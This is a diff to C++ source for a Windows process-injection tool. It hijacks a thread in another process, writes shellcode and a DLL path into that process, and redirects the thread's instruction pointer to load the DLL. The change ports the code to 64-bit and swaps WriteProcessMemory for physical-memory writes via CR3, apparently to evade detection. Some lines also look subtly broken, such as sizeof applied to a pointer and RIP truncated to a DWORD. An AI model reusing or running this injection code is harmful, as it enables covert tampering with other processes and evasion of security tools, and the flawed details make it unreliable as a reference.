@@ -1,5 +1,7 @@
+
 #include "utils.h"
 #include "shellcode.h"
+
 DWORD GetProcessThreadID(HANDLE Process)
 {
 	THREADENTRY32 entry;
@@ -23,7 +25,7 @@ DWORD GetProcessThreadID(HANDLE Process)
 }
 
 void threadHijacking(HANDLE proc, const wchar_t* dllPath) {
-
+	PMemHelper *mem = new PMemHelper();
 	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
 	LPVOID loadlibrary = GetProcAddress(kernel32, "LoadLibraryW"); //addr of loadlibrary.
 
@@ -42,31 +44,42 @@ void threadHijacking(HANDLE proc, const wchar_t* dllPath) {
 	// suspend the thread and query its control context
 	DWORD threadID = GetProcessThreadID(proc);
 
+	if (!threadID)
+	{
+		printf("\nError: Unable to open target thread handle (%d)\n", GetLastError());
+
+		VirtualFreeEx(proc, mem, 0, MEM_RELEASE);
+		CloseHandle(proc);
+		return;
+	}
+
 	// setting thread specific access rights
 	//THREAD_SUSPEND_RESUME for suspension of thread
 	//THREAD_GET_CONTEXT : Required to read the context of a thread using GetThreadContext. // MSDN
 	//THREAD_SET_CONTEXT : Required to write the context of a thread using SetThreadContext. // MSDN
 	HANDLE thread = OpenThread((THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT), false, threadID);
 	SuspendThread(thread);
+	printf("Suspending Thread");
 	//not that the thread is suspended, we can extract thread context information
 	CONTEXT threadContext;
 	threadContext.ContextFlags = CONTEXT_CONTROL; // // SS:SP, CS:IP, FLAGS, BP
 	GetThreadContext(thread, &threadContext); //2nd arg to extract context info
 
 											  //shellcode modification
-	memcpy(&shellcode[3], &stringMem, 4); //PUSH &stringMem
-	memcpy(&shellcode[8], &loadlibrary, 4); // MOV EAX, &LoadLibrary
-	memcpy(&shellcode[20], &threadContext.Eip, 4); //Eip -> Rip if compiling for 64bit
+	memcpy(&shellcode[65], &stringMem, 0x8); //PUSH &stringMem
+	memcpy(&shellcode[55], &loadlibrary, 0x8); // MOV EAX, &LoadLibrary
+	memcpy(&shellcode[121], &threadContext.Rip, 0x8); //Eip -> Rip if compiling for 64bit
 
-
+	
 												   //code caving
-												   //later I plan to use WPM using vulnerable driver asmmap from warya
-	WriteProcessMemory(proc, stringMem, dllPath, pathLength, NULL);
-	WriteProcessMemory(proc, shellCodeMem, shellcode, sizeof(shellcode), NULL);
-
-
+												   
+	//WriteProcessMemory(proc, stringMem, dllPath, pathLength, NULL);
+	//WriteProcessMemory(proc, shellCodeMem, shellcode, sizeof(shellcode), NULL);
+	mem->WriteVirtual(cr3, (uint64_t)stringMem, (LPVOID)dllPath, sizeof(dllPath));
+	mem->WriteVirtual(cr3, (uint64_t)shellCodeMem, (LPVOID)shellcode, sizeof(shellcode));
+	printf("ShellCode Injected");
 	//hijacking the thread, set EIp (RIP) to shellcode
-	threadContext.Eip = (DWORD)shellCodeMem;
+	threadContext.Rip = (DWORD)shellCodeMem;
 	threadContext.ContextFlags = CONTEXT_CONTROL;
 	SetThreadContext(thread, &threadContext);
 
